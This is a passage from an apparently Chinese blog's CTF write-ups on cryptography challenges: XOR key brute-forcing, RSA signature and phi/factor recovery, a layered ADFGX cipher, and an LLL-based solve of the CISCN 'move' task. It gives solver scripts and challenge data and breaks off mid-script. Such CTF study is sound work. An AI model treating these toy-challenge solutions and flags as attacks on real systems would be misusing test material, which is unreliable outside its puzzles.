class="number">128</span>):</span><br><span class="line">            key_stream = <span class="string">b'flag{it_1s_P@dd1n_@nd_'</span>+<span class="string">f'<span class="subst">{<span class="built_in">chr</span>(i)}</span>'</span>.encode()+<span class="string">f'<span class="subst">{<span class="built_in">chr</span>(j)}</span>'</span>.encode()+<span class="string">f'<span class="subst">{<span class="built_in">chr</span>(k)}</span>'</span>.encode()+<span class="string">b'}'</span></span><br><span class="line">            cipher = xor_bytes(key_stream, message)</span><br><span class="line">            <span class="keyword">if</span> cipher.<span class="built_in">hex</span>() == <span class="string">"02050701120a01334553393f32441d5e1b716027107f19334417"</span>:</span><br><span class="line">                <span class="built_in">print</span>(key_stream)</span><br><span class="line">                <span class="built_in">print</span>(cipher.<span class="built_in">hex</span>())</span><br><span class="line">                <span class="built_in">print</span>(xor_bytes(key_stream, cipher))</span><br></pre></td></tr></table></figure>
<h4 id="参考链接：-1"><a href="#参考链接：-1" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/">alexctf2k17-crypto100</a>（类似例题有杭电2019week1）</p>
<p><a href="https://www.wkr.moe/ctf/536.html">Wankko ReeのBlog</a></p>
<h2 id="RSAsig"><a href="#RSAsig" class="headerlink" title="RSAsig"></a>RSAsig</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> Crypto.Util.number</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> proof_of_work <span class="keyword">import</span> proof_of_work</span><br><span class="line">banner = <span class="string">'''</span></span><br><span class="line"><span class="string"> ____                             ____  _                   _</span></span><br><span class="line"><span class="string">/ ___|  ___  ___ _   _ _ __ ___  / ___|(_) __ _ _ __   __ _| |_ _   _ _ __ ___</span></span><br><span class="line"><span class="string">\___ \ / _ \/ __| | | | '__/ _ \ \___ \| |/ _` | '_ \ / _` | __| | | | '__/ _ \</span></span><br><span class="line"><span class="string"> ___) |  __/ (__| |_| | | |  __/  ___) | | (_| | | | | (_| | |_| |_| | | |  __/</span></span><br><span class="line"><span class="string">|____/ \___|\___|\__,_|_|  \___| |____/|_|\__, |_| |_|\__,_|\__|\__,_|_|  \___|</span></span><br><span class="line"><span class="string">                                          |___/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dosend</span>(<span class="params">m</span>):</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dorecv</span>():</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    <span class="keyword">return</span> sys.stdin.readline().strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>():</span></span><br><span class="line">    random_generator = Random.new().read</span><br><span class="line">    rsa = RSA.generate(<span class="number">1024</span>, random_generator)</span><br><span class="line">    private_pem = rsa</span><br><span class="line">    <span class="keyword">return</span> private_pem</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    rsakey = gen()</span><br><span class="line">    a = RSA._RSAobj(<span class="literal">None</span>, rsakey)</span><br><span class="line">    modBits = Crypto.Util.number.size(rsakey.n)</span><br><span class="line">    k = ceil_div(modBits,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">        dosend(<span class="string">"Welcome to this secure cryptosystem:"</span>)</span><br><span class="line">        dosend(<span class="string">"1.Get flag.\n2.Have my signature.\n3.Exit.\n4.Get my key."</span>)</span><br><span class="line">        dosend(<span class="string">"What is your choice?"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            option = <span class="built_in">int</span>(dorecv().strip())</span><br><span class="line">            <span class="keyword">if</span> option == <span class="number">1</span>:</span><br><span class="line">                cipher = rsakey.encrypt(flag, k)</span><br><span class="line">                dosend(b64encode(cipher[<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">elif</span> option == <span class="number">2</span>:</span><br><span class="line">                dosend(<span class="string">"What message to sign?"</span>)</span><br><span class="line">                m = <span class="built_in">int</span>(dorecv().strip())</span><br><span class="line">                sign = a.sign(m, k)</span><br><span class="line">                dosend(<span class="built_in">str</span>(sign[<span class="number">0</span>][<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">elif</span> option == <span class="number">3</span>:</span><br><span class="line">                dosend(<span class="string">"Bye~"</span>)</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">elif</span> option == <span class="number">4</span>:</span><br><span class="line">                dosend(<span class="built_in">str</span>(rsakey.n))</span><br><span class="line">                dosend(<span class="built_in">str</span>(rsakey.e))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dosend(<span class="string">"Invalid choice!"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            exit()</span><br><span class="line"><span class="comment">#if  proof_of_work():</span></span><br><span class="line"><span class="comment">#    exit()</span></span><br><span class="line"><span class="comment">#signal.alarm(20)</span></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答:"></a>解答:</h3><p>第一关为sha224爆破。基操，直接贴exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">str1 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):	</span><br><span class="line">			message = <span class="string">'{0}{1}{2}Vw3UrFafQ94N5k4QB'</span>.<span class="built_in">format</span>(str1[i],str1[j],str1[k])</span><br><span class="line">			<span class="comment">#print(message)</span></span><br><span class="line">			m = hashlib.sha224()</span><br><span class="line">			m.update(message.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">			c = m.hexdigest()</span><br><span class="line">			<span class="keyword">if</span> c == <span class="string">'6da53efa50c3ef1481cc0f403212262dd1bcead74d9f0b34f306318c'</span>:</span><br><span class="line">				<span class="built_in">print</span> (message)</span><br><span class="line">				<span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>
<p>爆破前3位字符，然后进下一关。</p>
<p>疑似非预期了，昨天早上复现到一半，机器被关了，连不上了。根据VN的wp和大佬的指点，可以想象到解法步骤：</p>
<p>点1拿到base64，将base64转为十进制数，拿到2里签名。签名出来直接转byte就是flag。</p>
<p><del>人麻了，人麻了。人麻了？人麻了！</del></p>
<h2 id="random（第一关RSA部分）"><a href="#random（第一关RSA部分）" class="headerlink" title="random（第一关RSA部分）"></a>random（第一关RSA部分）</h2><p>第一关都没过，还没做到LCG。</p>
<h3 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h3><h4 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rsa_sign:pow(m,d,p)</span><br><span class="line">e*d+n:3563329754048976946603729466426236052000141166700839903323255268203185709020494450173369806214666850943076188175778667508946270492708397447950521732324059148390232744011000065982865974194986726739638097566303135573072114448615095262066554751858952042395375417151593676621825939069783767865138657768553767717034970</span><br><span class="line">e*d-n:3563121718917234588723786463275555826875232380691165919033718924958406353810813480184744219046717838078497090403751007254545187720107602959381881715875898243474504999760208133192572812110967142474619366650504948619637909653723376917174456091396220576841259798792078769198369072982063716206690589554604992470787752</span><br><span class="line">tmp = e*d</span><br><span class="line">please sign the message with p:you_can_get_more_message</span><br><span class="line">please enter sign:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h4><p>先简单的二元一次方程解出<code>n</code>和<code>e*d</code>的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">len(bin(tmp))-2=1039</span><br><span class="line">len(bin(n))-2=1024</span><br></pre></td></tr></table></figure>
<p>可以发现，两者差了15位。</p>
<script type="math/tex; mode=display">
\because \,\,e\,\,\cdot \,\,d\,\,\equiv \,\,1\left( mod\,\,\varphi \left( n \right) \right) 
\\
\therefore \,\,e\,\,\cdot \,\,d\,\,-1 =\,\,k\,\,\cdot \,\,\varphi \left( n \right) \,\,, k\in N
\\
\because \,\,k\,\,=\,\,\frac{\left( e\,\,\cdot \,\,d\,\,-\,\,1 \right)}{\varphi \left( n \right)}
\\
\therefore \,\,k\,\,\in \,\,\left[ 2^{15},2^{16} \right]</script><p>写一个脚本爆破phi的值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phi=[]  <span class="comment">#11个</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">15</span>,<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">	<span class="keyword">if</span> ((tmp-<span class="number">1</span>) // i) * i != tmp-<span class="number">1</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		phi.append((tmp-<span class="number">1</span>) // i)	</span><br></pre></td></tr></table></figure>
<p>可以得到有11个可能的phi值。</p>
<p>随后用z3爆破，得到p和q</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x=Int(<span class="string">'x'</span>)</span><br><span class="line">y=Int(<span class="string">'y'</span>)</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">	s.add(x*y==n)</span><br><span class="line">	s.add(x+y==n-phi[i]+<span class="number">1</span>)</span><br><span class="line">	s.add(x&gt;<span class="number">0</span>)</span><br><span class="line">	s.add(y&gt;<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> s.check()!=sat:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(phi[i])</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">'x='</span>,s.model()[x])</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">'y='</span>,s.model()[y])</span><br><span class="line">		<span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">10980405508174271259925333166343579553719061316941945190323939083665489902286168861229664589365210026388298173482496757264697996404794685064674668272479771</span></span><br><span class="line">q = <span class="number">9473016801951797771267846445459738473973421588058140695253031511700407533935872397264731631901174665159278878658035094231228063878480145556088206641042779</span></span><br><span class="line">phi=<span class="number">104017565871178939971501575340112562454393004836992144768171622389677604840484994312793583974506432289548886013830127200541386300397244284320008224080452437410449815269897363953401430206474104816882552899007591140131802079961736224008071736969511510673117632180401571196581547933965545949203486211512709601060</span></span><br><span class="line"><span class="comment">#k=34256</span></span><br></pre></td></tr></table></figure>
<p>然后的操作比较复杂，先素数分解tmp，得到因子</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531610237-c911a761-78e2-4bfd-b151-1e21558fe511.png" alt="image-20210526080806673"></p>
<p>279位显然是可以忽略的，然后用以下代码判断e的因子。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e=[<span class="number">3</span>,<span class="number">47</span>,<span class="number">97</span>,<span class="number">157</span>,<span class="number">1601</span>,<span class="number">21851</span>,<span class="number">56277292709098311733</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	<span class="keyword">if</span> tmp // e[i] == inverse(e[i],phi):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">'e='</span>,e[i])</span><br><span class="line"><span class="comment">#因子为：56277292709098311733</span></span><br></pre></td></tr></table></figure>
<p>判断完因子后，使其互乘得到所有可能的e。代码来源于Wankko Ree大佬，用的算法类似于DFS。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">3</span>,<span class="number">47</span>,<span class="number">97</span>,<span class="number">157</span>,<span class="number">1601</span>,<span class="number">21851</span>]</span><br><span class="line">b = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span>(<span class="params">p, t</span>):</span></span><br><span class="line">    b.add(t)</span><br><span class="line">    <span class="keyword">if</span> p == <span class="built_in">len</span>(a):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    go(p+<span class="number">1</span>, t*a[p])</span><br><span class="line">    go(p+<span class="number">1</span>, t)</span><br><span class="line"></span><br><span class="line">go(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">c = <span class="built_in">list</span>(b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">	c[i]*=<span class="number">56277292709098311733</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>
<p>解出来后，需要爆破所有可能的e，总数量为</p>
<script type="math/tex; mode=display">
C_{6}^{0}+C_{6}^{1}+C_{6}^{2}+C_{6}^{3}+C_{6}^{4}+C_{6}^{5}+C_{6}^{6}=64</script><p>应该是很好理解的，然后pq的值不确定，同样需要爆破。由于需要用到pwn的remote模块，而我完全不会。同时靶机也在第二天关闭，未能完整复现。根据已有WP，e的值应该是<code>5627729270909831173 * 3 * 21851</code>，然后根据题目要求sign：<code>pow(m,d,p)</code>签名。</p>
<p>后半部分LCG未能复现。</p>
<h3 id="参考链接：-2"><a href="#参考链接：-2" class="headerlink" title="参考链接："></a>参考链接：</h3><p>WP参考VN战队wp，中间的递归求e来自于Wankko Ree大佬。</p>
]]></content>
      <tags>
        <tag>比赛复现</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛密码部分wp</title>
    <url>/2021/05/19/%E5%9B%BD%E8%B5%9B%E5%AF%86%E7%A0%81%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h1 id="国赛密码部分wp"><a href="#国赛密码部分wp" class="headerlink" title="国赛密码部分wp"></a>国赛密码部分wp</h1><p>这次国赛只做出两道密码，很丢人，便在赛后将能力范围内的赛题简单复现一下。</p>
<span id="more"></span>
<h2 id="一卷：classic"><a href="#一卷：classic" class="headerlink" title="一卷：classic"></a>一卷：classic</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AXAXDFDXXAFADFGFXAADFGDXGFDXFFDFAXDXFFFFXGXGAAXAGAFDDXFFDXFFDXDXDXDXGFDFAXFXAADXAAGAXGDGXAXAFAXXFFXADFFGAADXDXAXDFDFDXXAXXDXDAAAAAFAXAAAFGGAFGFGXADXXADFGADXDFDFGAGFDGAXFGAXDGDADXFFFFDAGFADXGDX</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>很明显的ADFGX加密，且不给密钥和关键字，也没有hint。<del>显然，出题人希望密码手们能在8小时内自主研发出量子计算机来攻克这题。</del></p>
<p>复现过程：</p>
<p>使用以下网址</p>
<p><img src="https://i.loli.net/2021/05/19/b2tc7NLp6P3kArV.png" alt="image-20210519130756056"></p>
<p>密钥使用以下公开密码表：PHQGMEAYNOFDXKRCVSZWBUTIL</p>
<p>关键字key清空，就能得到一串啥都看不懂的东西：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MMYOBFYSBHKOSOXYMOXXIIPBCDOXOXOOOOSYMRPOPCINBBFLXBYKPOOMYYOBLOEPPFBPKCKKBOBYCOYYCSNMKMNEOXXESHIO</span><br></pre></td></tr></table></figure>
<p>没想到吧，然后要进行栅栏密码</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531535764-ecfdd67d-2e36-4075-bb74-94b9319121f3.png" alt="image-20210519131121813"></p>
<p>然后还要凯撒</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531541674-b7d4d21c-a53d-4bcc-b057-839fe1ce886b.png" alt="image-20210519131157761"></p>
<p>终于发现了有一段CISCN字样。将里面的英语翻译一下，即可得到flag</p>
<h3 id="本题总结："><a href="#本题总结：" class="headerlink" title="本题总结："></a>本题总结：</h3><p>比赛时完全没有做出来，时间都花在爆破密钥、猜关键字、<del>寻觅量子计算机和祈祷图灵转世上了</del>。</p>
<h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a href="https://blog.csdn.net/weixin_43540515/article/details/113122845">1.4 ADFGX原理</a></p>
<p>睡不醒的某某车赛后wp</p>
<h2 id="二卷：move"><a href="#二卷：move" class="headerlink" title="二卷：move"></a>二卷：move</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><p>output.txt:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">h1 = <span class="number">3518005</span></span><br><span class="line">h2 = <span class="number">641975</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>task.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt, gcd</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">512</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(nbit)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    p = get_prime(nbit)</span><br><span class="line">    q = get_prime(nbit)</span><br><span class="line">    <span class="keyword">if</span> q &gt; p:</span><br><span class="line">        p, q = q, p</span><br><span class="line">    n = p * q</span><br><span class="line">    bound = <span class="built_in">int</span>(sqrt(<span class="number">2</span> * n)) // <span class="number">12</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = random.randint(<span class="number">1</span>, <span class="built_in">round</span>(sqrt(bound)))</span><br><span class="line">        y = random.randint(<span class="number">1</span>, bound) // x</span><br><span class="line">        zbound = <span class="built_in">int</span>(((p - q) * <span class="built_in">round</span>(n ** <span class="number">0.25</span>) * y) // (<span class="number">3</span> * (p + q)))</span><br><span class="line">        z = zbound - ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + zbound) % x</span><br><span class="line">        e = ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + z) // x</span><br><span class="line">        <span class="keyword">if</span> gcd(e, (p + <span class="number">1</span>) * (q + <span class="number">1</span>)) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    gifts = [<span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][:<span class="number">22</span>], <span class="number">2</span>), <span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][<span class="number">256</span>:<span class="number">276</span>], <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> n, e, gifts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p1 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    <span class="keyword">if</span> p2 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p1</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] <span class="keyword">and</span> (p1[<span class="number">1</span>] != p2[<span class="number">1</span>] <span class="keyword">or</span> p1[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>]:</span><br><span class="line">        tmp = (<span class="number">3</span> * p1[<span class="number">0</span>] * p1[<span class="number">0</span>]) * inverse(<span class="number">2</span> * p1[<span class="number">1</span>], n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = (p2[<span class="number">1</span>] - p1[<span class="number">1</span>]) * inverse(p2[<span class="number">0</span>] - p1[<span class="number">0</span>], n) % n</span><br><span class="line">    x = (tmp * tmp - p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) % n</span><br><span class="line">    y = (tmp * (p1[<span class="number">0</span>] - x) - p1[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">n, p</span>):</span></span><br><span class="line">    r = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            r = add(r, tmp)</span><br><span class="line">        n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp, tmp)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n, e, hint = gen(BITS)</span><br><span class="line">pt = (bytes_to_long(flag[:<span class="built_in">len</span>(flag) // <span class="number">2</span>]), bytes_to_long(flag[<span class="built_in">len</span>(flag) // <span class="number">2</span>:]))</span><br><span class="line">c = mul(e, pt)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h1 = <span class="subst">&#123;hint[<span class="number">0</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h2 = <span class="subst">&#123;hint[<span class="number">1</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>\n&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>虎符2021 simultaneous原题简化版</p>
<p>直接上exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p1 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    <span class="keyword">if</span> p2 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p1</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] <span class="keyword">and</span> (p1[<span class="number">1</span>] != p2[<span class="number">1</span>] <span class="keyword">or</span> p1[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>]:</span><br><span class="line">        tmp = (<span class="number">3</span> * p1[<span class="number">0</span>] * p1[<span class="number">0</span>]) * inverse(<span class="number">2</span> * p1[<span class="number">1</span>], n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = (p2[<span class="number">1</span>] - p1[<span class="number">1</span>]) * inverse(p2[<span class="number">0</span>] - p1[<span class="number">0</span>], n) % n</span><br><span class="line">    x = (tmp * tmp - p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) % n</span><br><span class="line">    y = (tmp * (p1[<span class="number">0</span>] - x) - p1[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">n, p</span>):</span></span><br><span class="line">    r = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            r = add(r, tmp)</span><br><span class="line">        n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp, tmp)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"> </span><br><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br><span class="line"><span class="comment"># M = Matrix(ZZ, [[2**512, e],</span></span><br><span class="line"><span class="comment">#                 [0, -n]])</span></span><br><span class="line"><span class="comment"># GV = M.LLL()[0]</span></span><br><span class="line">GV = (-<span class="number">352349739892292322999330613117511489276791137416050590322561272098135764509812116210543232353192946492907441641899508311181782397967869533800138447935440769558784357373166666205853969428654899524304252899588626355058283586558885888</span>, -<span class="number">406850608655407486298019095013146348847805975120061760929682791882948049742096195978800022454159691659865169100330308708576847735609146508679126419372034710027124703842712262177437006326228856546452636094881051757653949488135598409</span>)</span><br><span class="line">x = -GV[<span class="number">0</span>] &gt;&gt; <span class="number">512</span></span><br><span class="line">y = (e*x+GV[<span class="number">1</span>])//n</span><br><span class="line">k = e*x-n*y</span><br><span class="line">K = k//y</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor</span>(<span class="params">K, N</span>):</span></span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = K</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span 